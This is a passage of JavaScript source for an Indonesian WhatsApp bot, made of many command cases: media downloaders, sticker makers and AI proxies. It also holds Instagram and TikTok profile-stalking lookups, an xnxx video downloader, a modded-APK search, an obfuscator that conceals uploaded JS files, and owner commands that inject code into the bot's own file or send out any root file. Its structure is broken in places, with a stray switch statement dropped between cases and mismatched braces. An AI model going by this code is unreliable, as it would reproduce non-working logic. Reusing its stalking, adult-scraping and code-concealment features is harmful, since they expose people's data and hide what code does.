let gcall = Object.values(await dwiaff.groupFetchAllParticipating().catch(_=> null))
let listgc = '\n'
await gcall.forEach((u, i) => {
listgc += `*${i+1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
dwiaff.sendMessage(m.chat, {text: `${listgc}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: await getBuffer(ppuser), title: `${gcall.length} Group Chat`, body: `© ${namaOwner}`,  sourceUrl: global.linkSaluran, previewType: "PHOTO"}}}, {quoted: qtext})
}
break

case "reactch": {
if (!isOwner) return reply(mess.owner)
if (!text) return example("linkpesan 😂")
if (!args[0] || !args[1]) return example("linkpesan 😂")
if (!args[0].includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = args[0].split('/')[4]
let serverId = args[0].split('/')[5]
let res = await dwiaff.newsletterMetadata("invite", result)
await dwiaff.newsletterReactMessage(res.id, serverId, args[1])
m.reply(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)
}
break

case "cekidch": case "idch": {
if (!text) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await dwiaff.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
let msgii = await generateWAMessageFromContent(m.chat, { viewOnceMessageV2Extension: { message: { 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy ID Channel\",\"id\":\"123456789\",\"copy_code\":\"${res.id}\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m})
await dwiaff.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
}
break

case 'str': {
    if (!text) return m.reply('Format salah!\nGunakan: .str <mode> <tipe> <teks>\n\nMode:\n - encode\n - decode\n\nTipe:\n - char\n - hex\n\nContoh:\n.str encode char Halo\n.str encode hex Halo\n.str decode char 72,97,108,111\n.str decode hex 48616c6f');
    
    const args = text.split(' ');
    const mode = args[0]; 
    const type = args[1]; 
    const inputText = args.slice(2).join(' ');
    
    if (!mode || !type || !inputText) return m.reply('Format salah! Cek contoh penggunaan di atas.');
    
    let result;
    
    if (mode === 'encode') {
        if (type === 'char') {
            result = inputText.split('').map(char => char.charCodeAt(0)).join(', ');
        } else if (type === 'hex') {
            result = inputText.split('').map(char => char.charCodeAt(0).toString(16)).join(''); 
        } else {
            return m.reply('Tipe salah! Gunakan "char" atau "hex".');
        }
    } else if (mode === 'decode') {
        if (type === 'char') {
            result = inputText.split(',').map(code => String.fromCharCode(parseInt(code.trim()))).join('');
        } else if (type === 'hex') {
            result = inputText.match(/.{1,2}/g).map(hex => String.fromCharCode(parseInt(hex, 16))).join(''); 
        } else {
            return m.reply('Tipe salah! Gunakan "char" atau "hex".');
        }
    } else {
        return m.reply('Mode salah! Gunakan "encode" atau "decode".');
    }

    let pushname = m.pushName || m.sender.split('@')[0]; 
    let ppUrl = await jenzd.profilePictureUrl(m.sender, 'image').catch(() => 'https://telegra.ph/file/2f61d40b7cfb440f3cfa7.jpg');

    let pesan = `🍩 *Hasil ${mode.charAt(0).toUpperCase() + mode.slice(1)} (${type.toUpperCase()}):*\n\n\`\`\`${result}\`\`\``;

    let msg = {
        image: { url: ppUrl },
        caption: `👤 *${pushname}*\n\n${pesan}`,
        contextInfo: { mentionedJid: [m.sender] }
    };

    // Kirim pesan utama
    await dwiaff.sendMessage(m.chat, msg);

    // 🔘 Kirim tombol "Copy Code"
    let copyMsg = await generateWAMessageFromContent(m.chat, { 
        viewOnceMessageV2Extension: { 
            message: { 
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({ 
                        text: `🔢 *Copy hasil ${mode} (${type}):*`
                    }), 
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                        buttons: [{
                            "name": "cta_copy",
                            "buttonParamsJson": `{\"display_text\":\"📋 Copy Code\",\"id\":\"copy_result\",\"copy_code\":\"${result}\"}`
                        }]
                    })
                })
            }
        } 
    }, { userJid: m.sender, quoted: m });

    await dwiaff.relayMessage(m.chat, copyMsg.message, { messageId: copyMsg.key.id });
}
break;

case "brat": {
if (!text) return m.reply(example('teksnya'))
let brat = `https://nabzxbotz.biz.id/imagecreator/brat?text=${text}`
let response = await axios.get(brat, { responseType: "arraybuffer" })
let videoBuffer = response.data;
try {
await dwiaff.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {

}
}
break

case "emojigif": {
if (!text) return m.reply(example('😍'))
try {
let brat = `https://nabzxbotz.biz.id/tools/emojitogif?emoji=${encodeURIComponent(text)}`;
let response = await axios.get(brat, { responseType: "arraybuffer" });
let videoBuffer = response.data;
let stickerBuffer = await dwiaff.sendAsSticker(m.chat, videoBuffer, m, {
packname: global.packname,
})
} catch (err) {
console.error("Error:", err);
}
}
break

case "emojimix": {
if (!text) return m.reply(example('😀|😍'))
if (!text.split("|")) return m.reply(example('😀|😍'))
let [e1, e2] = text.split("|")
let brat = `https://nabzxbotz.biz.id/tools/emojimix?emoji1=${encodeURIComponent(e1)}&emoji2=${encodeURIComponent(e2)}`
let videoBuffer = await getBuffer(brat)
try {
await dwiaff.sendAsSticker(m.chat, videoBuffer, m, {packname: global.packname})
} catch {}
}
break
       
case "tt": case "tiktok": {
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
if (!result.status) return m.reply("Error")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: dwiaff.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await dwiaff.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await dwiaff.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
}
break

case "tourl": { 
if (!/image|video/i.test(mime)) return m.reply(`Ketik *.${command}* dengan kirim foto/video`)
     if (mime.includes("video") && qmsg.seconds > 30) return m.reply("Durasi video tidak boleh melebihi 30 detik")

const FormData = require('form-data');
const { fromBuffer } = require('file-type');
let buff = m.quoted ? await m.quoted.download() : await m.download();
let { ext } = await fromBuffer(buff);
let bodyForm = new FormData();
bodyForm.append("fileToUpload", buff, "file." + ext);
bodyForm.append("reqtype", "fileupload");

let res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: bodyForm,
});
let directLink = await res.text();

let msgii = await generateWAMessageFromContent(m.chat, { 
    viewOnceMessageV2Extension: { 
        message: { 
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({ 
                    text: `Berikut link media Anda:\n${directLink}`
                }), 
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
                    buttons: [{
                        "name": "cta_copy",
                        "buttonParamsJson": `{"display_text":"Copy Url Media","id":"123456789","copy_code":"${directLink}"}`
                    }]
                })
            })
        }
    }
}, { userJid: m.sender, quoted: m });

await dwiaff.relayMessage(m.chat, msgii.message, { 
    messageId: msgii.key.id 
});

}
 break;

case "deepseek": case "depsek": case "deepsek": {
let talk = text ? text : "Hallo Kamu Siapa ?"
await fetchJson("https://nabzxbotz.biz.id/ai/deepseek?text=" + talk).then(async (res) => {
await m.reply(res.result)
}).catch(e => m.reply(e.toString()))
}
break

case 'deepimg': {
 if (!text) return m.reply("Masukkan prompt gambar.")
 m.reply("Sedang memproses gambar, mohon tunggu...")

 try {
const axios = require('axios');
 let { data } = await axios.post("https://api-preview.chatgot.io/api/v1/deepimg/flux-1-dev", {
 prompt: text,
 size: "1024x1024",
 device_id: `dev-${Math.floor(Math.random() * 1000000)}`
 }, {
 headers: {
 "Content-Type": "application/json",
 Origin: "https://deepimg.ai",
 Referer: "https://deepimg.ai/"
 }
 })
 let imageUrl = data?.data?.images?.[0]?.url
 if (!imageUrl) return m.reply("Gagal membuat gambar. Coba ganti promptnya.")
 await dwiaff.sendMessage(m.chat, { 
 image: { url: imageUrl }, 
 caption: `🖼️ *Gambar Berhasil Dibuat!*\n📜 *Prompt:* ${text}` 
 }, { quoted: m })
 } catch (err) {
 console.error(err.response ? err.response.data : err.message)
 m.reply("Terjadi kesalahan saat memproses gambar.")
 }
}
break

case "enchard": case "encrypthard": {
if (!/javascript/g.test(mime)) return example("dengan kirim file .js")
let media = await m.quoted.download()
let filename = m.quoted.message.documentMessage.fileName
await m.reply("Memproses encrypt hard code . . .")
await JsConfuser.obfuscate(media.toString(), {
  target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = `素晴座素晴NabzxBotz`

        function hapusKarakterTidakDiinginkan(input) {
            return input.replace(
                /[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, ''
            );
        }

        function stringAcak(panjang) {
            let hasil = '';
            const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            const panjangKarakter = karakter.length;

            for (let i = 0; i < panjang; i++) {
                hasil += karakter.charAt(
                    Math.floor(Math.random() * panjangKarakter)
                );
            }
            return hasil;
        }

        return hapusKarakterTidakDiinginkan(originalString) + stringAcak(2);
    },

    renameVariables: true,
    renameGlobals: true,

    // Kurangi encoding dan pemisahan string untuk mengoptimalkan ukuran
    stringEncoding: 0.01, 
    stringSplitting: 0.1, 
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: true,

    shuffle: {
        hash: false,
        true: false
    },
    controlFlowFlattening: false, 
    opaquePredicates: false, 
    deadCode: false, 
    dispatcher: false,
    rgf: false,
    calculator: false,
    hexadecimalNumbers: false,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@hardenc${filename}`, obfuscated.code)
  await dwiaff.sendMessage(m.chat, {document: await fs.readFileSync(`./@hardenc${filename}`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\nString"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
await fs.unlinkSync(`./@hardenc${filename}`)
}
break

case "ai": case "gpt": case "openai": {
let talk = text ? text : "hai"
await fetchJson("https://nabzxbotz.biz.id/ai/openai?text=" + talk).then(async (res) => {
await m.reply(res.result)
}).catch(e => m.reply(e.toString()))
}
break

case "tiktokmp3": case "ttmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await dwiaff.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
await dwiaff.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => reply("Error! Result Not Found"))
}
break

case "mediafire":
 if (!text) return m.reply("Masukkan link MediaFire yang ingin diunduh!");
 try {
 const response = await fetch('https://r.jina.ai/' + text, { 
 headers: { 'x-return-format': 'html' } 
 });
 if (!response.ok) throw new Error("Gagal mengambil data dari MediaFire!");
 const cheerio = require('cheerio');
 const textHtml = await response.text();
 const $ = cheerio.load(textHtml);
 const TimeMatch = $('div.DLExtraInfo-uploadLocation div.DLExtraInfo-sectionDetails')
 .text()
 .match(/This file was uploaded from (.*?) on (.*?) at (.*?)\n/);
 const fileSize = $('a#downloadButton').text().trim().split('\n')[0].trim();
 const result = {
 title: $('div.dl-btn-label').text().trim() || "Tidak diketahui",
 filename: $('div.dl-btn-label').attr('title') || "file",
 url: $('a#downloadButton').attr('href'),
 size: fileSize || "Tidak diketahui",
 from: TimeMatch?.[1] || "Tidak diketahui",
 date: TimeMatch?.[2] || "Tidak diketahui",
 time: TimeMatch?.[3] || "Tidak diketahui"
 };
 if (!result.url) throw new Error("Gagal mendapatkan link unduhan!");
 const caption = `✅ *Berhasil mengunduh file dari MediaFire!*\n\n`
 + `📂 *Nama File:* ${result.filename}\n`
 + `📦 *Ukuran:* ${result.size}\n`
 + `📅 *Tanggal Unggah:* ${result.date}\n`
 + `⏰ *Waktu Unggah:* ${result.time}\n`
 + `🌍 *Diupload dari:* ${result.from}\n\n`
 + `🔗 *Link:* ${result.url}`;
 await dwiaff.sendMessage(m.chat, { 
 document: { url: result.url },
 mimetype: 'application/octet-stream',
 fileName: result.filename,
 caption: caption
 }, { quoted: m });
 } catch (error) {
 m.reply(`❌ *Gagal mengunduh file:* ${error.message}`);
 }
 break
 
 case "igstalk": {
if (!text) return m.reply(example("username"))
try {
let res = await func.fetchJson(`https://nabzxbotz.biz.id/stalk/instagram?apikey=${global.apibotnabzx}&user=${q}`)
const teks = `
* *Nama :* ${res.result.name}
* *Username :* ${res.result.username}
* *Bio :* ${res.result.bio}
* *Total Postingan :* ${res.result.posts}
* *Followers :* ${res.result.followers}
* *Following :* ${res.result.following}
`
await dwiaff.sendMessage(m.chat, {image: {url: res.result.avatar}, caption: teks}, {quoted: m})
} catch (err) {
return m.reply("Error : "+err)
}
}
break

case "tiktokstalk": case "ttstalk": {
if (!text) return m.reply(example("username"))
try {
const res = await func.fetchJson(`https://nabzxbotz.biz.id/stalk/tiktok?apikey=${global.apibotnabzx}&user=${text}`)
if (!res.status) return m.reply("Error nama pengguna tidak ditemukan")
const teks = `
* *Nama :* ${res.result.nickname}
* *Username :* ${res.result.uniqueId}
* *Bio :* ${res?.result?.signature || ""}
* *Followers :* ${res.result.followerCount}
* *Following :* ${res.result.followingCount}
* *Private :* ${res.result.privateAccount == true ? "Ya" : "Tidak"}
`
await dwiaff.sendMessage(m.chat, {image: {url: res.result.avatarMedium}, caption: teks}, {quoted: m})
} catch (err) {
return m.reply("Error : "+err)
}
}
break

case "videy": {
if (!text) return m.reply(example("linknya"))
m.reply("📥 Memproses videy downloader . .")
var anu = await func.fetchJson(`https://nabzxbotz.biz.id/download/videy?apikey=${global.apibotnabzx}&url=${text}`)
if (anu.status) {
await dwiaff.sendMessage(m.chat, {video: {url: anu.result}, caption: "Videy Download Done ✅"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
}
break

case "xnxx": case "xnxxdl": {
if (!q) return m.reply(example("linknya"))
let data = await func.fetchJson(`https://nabzxbotz.biz.id/download/xnxx?apikey=${global.apibotnabzx}&url=${q}`)
if (!data.result) return m.reply("Result tidak ditemukan!")
await dwiaff.sendMessage(m.chat, {video: {url: data.result.files.high || data.result.files.low}, caption: "XNXX Download Done ✅", mimetype: "video/mp4"}, {quoted: m})
}
break

case "xnxxs": case "xnxxsearch": {
if (!q) return m.reply(example("step sister"))
let data = await func.fetchJson(`https://nabzxbotz.biz.id/search/xnxx?apikey=${global.apibotnabzx}&q=${q}`)
if (data.result.length < 1) return m.reply("Result tidak ditemukan!")
let anuan = data.result
let teks = ""
for (let res of anuan) {
teks += `\n* *Title :* ${res.title}
* *Info :* ${res.info.trim()}
* *Link :* ${res.link}\n`
}
await m.reply(teks)
}
break

case "apkmod": {
if (!text) return m.reply(example("capcut"))
await fetchJson(`https://nabzxbotz.biz.id/search/happymod?q=${text}`).then((res) => {
let teks = ""
for (let i of res.result) {
teks += `\n* *Nama Apk :* ${i.name}
* *Link Download:* ${i.url}\n`
}
m.reply(teks)
dwiaff.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch(e => m.reply("Error"))
}
break

case 'bilibilisearch': {
  if (!q) return m.reply(m.chat, `❌ Masukkan kata kunci!\n\n*Contoh:*\n${prefix + command} yosuga no sora`, m)

  try {
    let res = await fetch(`https://api.hiuraa.my.id/search/bilibili?q=${encodeURIComponent(q)}`)
    let data = await res.json()
    let result = data.result

    if (!result || result.length === 0) {
      return m.reply(m.chat, '😞 Maaf, tidak ada hasil yang ditemukan!', m)
    }

    let vid = result[Math.floor(Math.random() * result.length)]
    let caption = `
🎬 *${vid.title}*
👤 *Creator:* ${vid.creator.name}
🔗 *Profile:* ${vid.creator.link}
👁️ *Views:* ${vid.views}
⏳ *Duration:* ${vid.duration}
📺 *Tonton:* ${vid.link}
    `.trim()

    await dwiaff.sendMessage(m.chat, {
      image: { url: vid.imageUrl },
      caption: caption,
      footer: 'Bilibili Search by Bot',
      buttons: [
        { buttonId: `${prefix + command} ${q}`, buttonText: { displayText: '🔁 Cari Lagi' }, type: 1 },
        { buttonId: `.menu`, buttonText: { displayText: '📋 Menu' }, type: 1 }
      ]
    }, { quoted: m })

  } catch (e) {
    console.log(e)
    conn.reply(m.chat, '❌ Terjadi kesalahan saat mengambil data!', m)
  }
}
break

case "play": {
if (!text) return m.reply(example("dj tiktok"))
await dwiaff.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const res = await ytsSearch.all[0]

var anu = await ytmp3(res.url)
if (anu.audio) {
let urlMp3 = anu.audio
await dwiaff.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg", contextInfo: { externalAdReply: {thumbnailUrl: res.thumbnail, title: res.title, body: `Author ${res.author.name} || Duration ${res.timestamp}`, sourceUrl: res.url, renderLargerThumbnail: true, mediaType: 1}}}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
}
break

case "tr": case "translate": {
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return m.reply(example("id good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return m.reply(example("id good night"))
if (args.length < 1) return m.reply(example("id good night"))
if (!m.quoted.text) return m.reply(example("id good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
reply(result[0])
}
} else {
return m.reply(example("id good night"))
}}
break

case 'listcase': {
    if (!isOwner) return reply(mess.owner)

    const totalFiturr = () => {
        var mytext = fs.readFileSync("./dwiaff.js").toString();
        var numUpper = (mytext.match(/case '/g) || []).length;
        return numUpper;
    }

    const listCase = () => {
        const code = fs.readFileSync("./dwiaff.js", "utf8");
        var regex = /case\s+'([^']+)':/g;
        var matches = [];
        var match;
        while ((match = regex.exec(code))) {
            matches.push(match[1]);
        }
        let teks = `Total fitur: ${totalFiturr()} \n\n`;
        matches.forEach(function (x) {
            teks += " • " + x + "\n";
        });
        return teks;
    }

    m.reply(listCase());
}
break;

case 'addcase': {
if (!isCreator) return reply(mess.owner)
if (!text) return m.reply(`Contoh: ${prefix+command} case nya`);
const namaFile = path.join(__dirname, 'dwiaff.js');
const caseBaru = `${text}\n\n`;
const tambahCase = (data, caseBaru) => {
const posisiDefault = data.lastIndexOf("default:");
if (posisiDefault !== -1) {
const kodeBaruLengkap = data.slice(0, posisiDefault) + caseBaru + data.slice(posisiDefault);
return { success: true, kodeBaruLengkap };
} else {
return { success: false, message: "Tidak dapat menemukan case default di dalam file!" };
}};
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('Terjadi kesalahan saat membaca file:', err);
return m.reply(`Terjadi kesalahan saat membaca file: ${err.message}`);
}
const result = tambahCase(data, caseBaru);
if (result.success) {
fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
if (err) {
console.error('Terjadi kesalahan saat menulis file:', err);
return m.reply(`Terjadi kesalahan saat menulis file: ${err.message}`);
} else {
console.log('Sukses menambahkan case baru:');
console.log(caseBaru);
return m.reply('Sukses menambahkan case!');
}});
} else {
console.error(result.message);
return m.reply(result.message);
}});
}
break

case 'delcase': {
if (!isCreator) return reply(mess.owner)
if (!text) return m.reply(`Contoh: ${prefix+command} nama case`);
const fs = require('fs').promises;
async function dellCase(filePath, caseNameToRemove) {
try {
let data = await fs.readFile(filePath, 'utf8');
const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
const modifiedData = data.replace(regex, '');
if (data === modifiedData) {
m.reply('Case tidak ditemukan atau sudah dihapus.');
return;
}
await fs.writeFile(filePath, modifiedData, 'utf8');
m.reply('Sukses menghapus case!');
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}}
dellCase('./dwiaff.js', q);
break;
}

case "getcase": {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply(example("menu"));
    
    const getcase = (cases) => {
        try {
            const fileContent = fs.readFileSync('./dwiaff.js').toString();
            const regex = new RegExp(`case\\s+["']${cases}["']([\\s\\S]*?)(?=case\\s+["']|default:|\\Z)`, 'g');
            const match = regex.exec(fileContent);

            if (match) {
                return "case " + `"${cases}"` + match[1];
            } else {
                return null;
            }
        } catch (err) {
            return null;
        }
    };

    try {
        const result = getcase(q);
        if (result) {
            reply(`${result}`);
        } else {
            m.reply(`Case *${text}* Tidak Ditemukan`);
        }
    } catch (e) {
        return m.reply(`Error: ${e.message}`);
    }
}
break;

case "getfile": {
    if (!isCreator) return reply(mess.owner);

    const sendFile = (file) => {
        try {
            const filePath = `./${file}`;
            if (!fs.existsSync(filePath)) return `File *${file}* tidak ditemukan.`;

            return filePath;
        } catch (err) {
            return `Terjadi kesalahan: ${err.message}`;
        }
    };

    if (!text) {
        // Menampilkan daftar file di folder root sebagai pilihan
        const files = fs.readdirSync("./").filter(file => fs.statSync(`./${file}`).isFile());
        if (files.length === 0) return m.reply("Tidak ada file yang tersedia.");

        let buttons = files.slice(0, 5).map((file, index) => ({
            buttonId: `.getfile ${file}`,
            buttonText: { displayText: file },
            type: 1,
        }));

        let buttonMessage = {
            text: "Silakan pilih file yang ingin diambil:",
            buttons: buttons,
            headerType: 1,
        };

        return dwiaff.sendMessage(m.chat, buttonMessage, { quoted: m });
    }

    try {
        const filePath = sendFile(text);
        if (filePath.startsWith("File") || filePath.startsWith("Terjadi")) {
            return m.reply(filePath);
        }

        dwiaff.sendMessage(
            m.chat,
            { document: { url: filePath }, mimetype: "application/octet-stream", fileName: text },
            { quoted: m }
        );
    } catch (e) {
        return m.reply(`Terjadi kesalahan: ${e.message}`);
    }
}
break;

case "addstick": case "savesticker": case "savestick": case "savestik": {
if (!isCreator) return reply(mess.owner)
if (!m.quoted) return m.reply(example("dengan balas sticker"))
if (!/webp/g.test(mime)) return m.reply(example("dengan balas sticker"))
let data = await dwiaff.downloadAndSaveMediaMessage(qmsg, "./dwiaffD/"+makeid+".webp", false)
let dir = await fs.readdirSync("./dwiaffD").filter(v => v !== "verif.js")
await m.reply(`*Berhasil Menyimpan Sticker ✅*\n\nUntuk Mengambil Sticker Ketik *.getsticker*\n\nUntuk Menghapus Sticker Ketik *.delsticker*\n\nTotal Sticker Tersimpan : *${dir.length} Sticker*`)
}
break

case "bratvid":  case "bratvideo": {
if (!text) return m.reply(example('teksnya'))
try {
let brat = `https://fgsi-brat.hf.space/?text=${encodeURIComponent(text)}&isVideo=true`;
let response = await axios.get(brat, { responseType: "arraybuffer" });
let videoBuffer = response.data;
let stickerBuffer = await dwiaff.sendAsSticker(m.chat, videoBuffer, m, {
packname: global.packname,
})
} catch (err) {
console.error("Error:", err);
}
}
break

case "getsticker": {
if (!isCreator) return reply(mess.owner)
let dir = await fs.readdirSync("./dwiaffD").filter(v => v !== "verif.js")
if (dir.length < 1) return m.reply("Tidak Ada Sticker Yang Tersimpan")
await m.reply(`${dir.length} Sticker Tersimpan, Tunggu Sebentar Bot Akan Mengirim Semua Sticker`)
for (let i of dir) {
await dwiaff.sendStimg(m.chat, "./dwiaffD/"+i, m, {packname: global.packname})
}
}
break

case "ytmp4": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
var anu = await fetchJson(`https://aemt.uk.to/download/ytdl?url=${text}`)

if (anu.status) {
let urlMp3 = anu.result.mp4
await dwiaff.sendMessage(m.chat, {video: {url: urlMp3}, mimetype: "video/mp4"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await dwiaff.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

switch (command) {        
case "ytmp3": 
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")

var anu = await fetchJson(`https://aemt.uk.to/download/ytdl?url=${text}`)

if (anu.status) {
let urlMp3 = anu.result.mp3
await dwiaff.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return m.reply("Error! Result Not Found")
}
await dwiaff.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

case "tohd": case "hd": {
if (!/image/.test(mime)) return m.reply(example("dengan kirim/reply foto"))
let foto = await dwiaff.downloadAndSaveMediaMessage(qmsg)
let result = await remini(await fs.readFileSync(foto), "enhance")
await dwiaff.sendMessage(m.chat, {image: result}, {quoted: m})
await fs.unlinkSync(foto)
}
break

case "s": case "sticker": case "stiker": {
if (!/image|video/gi.test(mime)) return m.reply(example("dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await dwiaff.downloadAndSaveMediaMessage(qmsg)
await dwiaff.sendAsSticker(m.chat, image, m, {packname: global.packname})
await fs.unlinkSync(image)
}
break

case "instagram": case "igdl": case "ig": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await fetchJson(`https://nabzxbotz.biz.id/download/instagram?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
if (res.result.downloadUrls.length > 1) {
for (let i of res.result.downloadUrls) {
await dwiaff.sendMessage(m.chat, {image: {url: i}, caption: "*Instagram Downloader ✅*"}, {quoted: m})
}
} else {
await dwiaff.sendMessage(m.chat, {video: {url: res.result.downloadUrls[0]}, mimetype: "video/mp4", caption: "*Instagram Downloader ✅*"}, {quoted: m})
}
}).catch((e) => m.reply("Error"))
}
break

case "qc": {        
if (!quoted){
const getname = await dwiaff.getName(mentionUser[0])
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#000000",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": getname,
"photo": {
"url": ppuser
}
},
"text": quotedMsg.chats,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
dwiaff.sendAsSticker(from, buffer, m, opt)
});
} else if (q) {
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#000000",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": ppuser
}
},
"text": q,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
dwiaff.sendAsSticker(from, buffer, m, opt)
});
} else {
reply(`Kirim perintah ${prefix+command} text atau reply pesan dengan perintah ${prefix+command}`)
}
}
break

case "swm": case "stickerwm": case "stikerwm": case "wm": {
if (!text) return m.reply(example("namamu dengan kirim media"))
if (!/image|video/gi.test(mime)) return m.reply(example("namamu dengan kirim media"))
if (/video/gi.test(mime) && qmsg.seconds > 15) return m.reply("Durasi vidio maksimal 15 detik!")
var image = await dwiaff.downloadAndSaveMediaMessage(qmsg)
await dwiaff.sendAsSticker(m.chat, image, m, {packname: text})
await fs.unlinkSync(image)
}
break

case "subdomain": case "subdo": {
const obj = Object.keys(global.subdomain)
let count = 0
let teks = `
 *#- List all domain server*\n`
for (let i of obj) {
count++
teks += `\n* ${count}. ${i}\n`
}
teks += `\n Contoh : *.domain 2 host|ipvps*\n`
m.reply(teks)

}
break

case "buatgc": {
if (!isOwner) return m.reply(msg.owner)
if (!q) return m.reply("nama grup")
let res = await dwiaff.groupCreate(q, [])
const urlGrup = "https://chat.whatsapp.com/" + await dwiaff.groupInviteCode(res.id)
let teks = `
*Grup WhatsApp Berhasil Dibuat ✅*
${urlGrup}
`
